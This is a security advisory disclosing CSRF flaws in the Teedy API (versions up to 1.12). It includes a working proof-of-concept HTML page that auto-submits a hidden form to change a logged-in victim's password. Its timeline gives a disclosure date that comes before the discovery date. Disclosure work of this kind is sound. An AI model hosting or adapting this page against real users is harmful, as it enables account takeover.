# CVE-2024-54851

## Summary

| ID                    | CVE-2024-54851                                           |
|-----------------------|----------------------------------------------------------|
| **Type**              | CSRF                                                     |
| **Title**             | Multiple CSRF                                            |
| **Product impacted**  | Teedy                                                    |
| **Impacted version**  | <= 1.12                                                  |
| **CVSS Score**        | 6.5                                                      |
| **Author**            | Sopalinge                                                |

## Description

Due to the lack of Cross-Site Request Forgery (CSRF) protections, most requests of the Teedy API in versions 1.12 and prior are vulnerable to such attack. This allows unauthenticated remote attackers to trick users into unknowingly performing arbitrary actions, such as editing profile information or tampering with the application data.

The only requests that are not vulnerable are the ones that ask for the account password, as it can't be guessed by the attacker.

The session cookie `SameSite` attribute is not defined, therefore the exploitation of POST CSRF will depend on the browser of the victim.

## Impact

The Teedy API documentation did not reveal any sensitive GET requests. However, multiple POST/PUT/DELETE... requests are sensitive and vulnerable to CSRF. The following requests are vulnerable (non-exhaustive list) :
 - Password change for current user
 - Account information change for any user
 - Account deletion for current or any user
 - Disable TOTP authentication for any user
 - Create a new user
 - Add any user to any group
 - Remove any user to any group
 - Delete group
 - ...


## Proof of concept

This PoC will trick the user into changing its current password for the one defined in the `value` attributes below. The attacker has to host the following page onto its server and trick a user connected to Teedy to visit this website.
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://172.21.114.187:8080/api/user" method="POST">
      <input type="hidden" name="password" value="hackedpwd" />
      <input type="hidden" name="passwordconfirm" value="hackedpwd" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

> [!IMPORTANT]
> In Chromium-based browser, the user needs to have connected 2 min prior to visiting the attacker page, due to the default behaviour of the SameSite attribute when not defined [^1].

[^1]: [Chromium SameSite FAQ](https://www.chromium.org/updates/same-site/faq/)

## Timeline

- 23/10/2024 : Vulnerability discovered
- 24/10/2024 : Vendor contacted
- 12/12/2024 : CVE ID attributed
- 28/01/2024 : CVE publicly disclosed


## References

- [Teedy source code](https://github.com/sismics/docs)
